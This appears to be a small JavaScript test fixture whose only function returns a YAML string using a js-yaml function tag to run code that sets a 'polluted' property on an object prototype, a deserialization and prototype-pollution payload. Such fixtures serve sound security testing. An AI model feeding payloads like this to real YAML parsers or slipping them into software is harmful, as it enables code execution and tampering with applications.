function getPayload() {
    return "{ toString: !<tag:yaml.org,2002:js/function> 'function (){return (this.constructor.prototype.polluted=`yes`)}' } : 1";
}

module.exports = { getPayload };